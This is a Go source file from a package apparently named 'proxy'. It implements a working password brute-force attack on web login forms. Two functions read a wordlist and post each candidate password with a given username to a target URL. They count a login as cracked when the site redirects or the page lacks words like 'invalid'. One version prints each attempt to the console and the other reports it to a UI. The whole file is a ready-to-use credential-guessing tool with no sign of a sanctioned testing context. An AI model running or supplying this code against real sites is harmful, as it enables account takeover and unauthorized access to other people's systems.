package proxy

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

type AttackProgressMsg struct {
	AttemptCount int
	Password     string
	Status       string // "Running", "Success", "Failed", "Error"
	FinalURL     string
	ErrorMsg     string
}

func RunBruteForce(targetURL, username, wordlist string) {
	fmt.Println("Starting brute force attack tool...")
	fmt.Printf("Target: %s\n", targetURL)
	fmt.Printf("Username: %s\n", username)
	fmt.Printf("Wordlist: %s\n", wordlist)

	file, err := os.Open(wordlist)
	if err != nil {
		fmt.Printf("Error opening wordlist: %v\n", err)
		return
	}
	defer file.Close()

	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return nil
		},
	}

	scanner := bufio.NewScanner(file)
	attemptCount := 0
	for scanner.Scan() {
		password := strings.TrimSpace(scanner.Text())
		if password == "" {
			continue
		}
		attemptCount++

		fmt.Printf("\rAttempt %d: Trying password '%s'...", attemptCount, password)

		data := url.Values{}
		data.Set("username", username)
		data.Set("password", password)

		req, err := http.NewRequest("POST", targetURL, strings.NewReader(data.Encode()))
		if err != nil {
			fmt.Printf("\n[!] Error creating request: %v\n", err)
			continue
		}
		req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("\n[!] Request failed: %v\n", err)
			continue
		}

		bodyBytes, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		finalURL := resp.Request.URL.String()
		isSuccess := false

		if finalURL != targetURL && resp.StatusCode >= 200 && resp.StatusCode < 300 {
			isSuccess = true
		} else if resp.StatusCode == 302 || resp.StatusCode == 301 {
			isSuccess = true
		} else if resp.StatusCode == 200 && !strings.Contains(strings.ToLower(string(bodyBytes)), "incorrect") && !strings.Contains(strings.ToLower(string(bodyBytes)), "invalid") && !strings.Contains(strings.ToLower(string(bodyBytes)), "failed") {
			if finalURL != targetURL {
				isSuccess = true
			}
		}

		if isSuccess {
			fmt.Printf("\n[+] SUCCESS! Password found: %s\n", password)
			fmt.Printf("[+] Final URL reached: %s (Status: %d)\n", finalURL, resp.StatusCode)
			return
		}
	}

	if err := scanner.Err(); err != nil {
		fmt.Printf("\nError reading wordlist: %v\n", err)
	}

	fmt.Printf("\n[-] Attack finished. Password not found.\n")
}

func RunBruteForceUI(targetURL, username, wordlist string, updateChan chan<- AttackProgressMsg) {
	file, err := os.Open(wordlist)
	if err != nil {
		updateChan <- AttackProgressMsg{Status: "Error", ErrorMsg: fmt.Sprintf("Error opening wordlist: %v", err)}
		return
	}
	defer file.Close()

	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return nil
		},
	}

	scanner := bufio.NewScanner(file)
	attemptCount := 0
	for scanner.Scan() {
		password := strings.TrimSpace(scanner.Text())
		if password == "" {
			continue
		}
		attemptCount++

		updateChan <- AttackProgressMsg{
			AttemptCount: attemptCount,
			Password:     password,
			Status:       "Running",
		}

		data := url.Values{}
		data.Set("username", username)
		data.Set("password", password)

		req, err := http.NewRequest("POST", targetURL, strings.NewReader(data.Encode()))
		if err != nil {
			continue
		}
		req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		bodyBytes, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		finalURL := resp.Request.URL.String()
		isSuccess := false

		if finalURL != targetURL && resp.StatusCode >= 200 && resp.StatusCode < 300 {
			isSuccess = true
		} else if resp.StatusCode == 302 || resp.StatusCode == 301 {
			isSuccess = true
		} else if resp.StatusCode == 200 && !strings.Contains(strings.ToLower(string(bodyBytes)), "incorrect") && !strings.Contains(strings.ToLower(string(bodyBytes)), "invalid") && !strings.Contains(strings.ToLower(string(bodyBytes)), "failed") {
			if finalURL != targetURL {
				isSuccess = true
			}
		}

		if isSuccess {
			updateChan <- AttackProgressMsg{
				AttemptCount: attemptCount,
				Password:     password,
				Status:       "Success",
				FinalURL:     finalURL,
			}
			return
		}
	}

	if err := scanner.Err(); err != nil {
		updateChan <- AttackProgressMsg{Status: "Error", ErrorMsg: fmt.Sprintf("Error reading wordlist: %v", err)}
		return
	}

	updateChan <- AttackProgressMsg{Status: "Failed"}
}
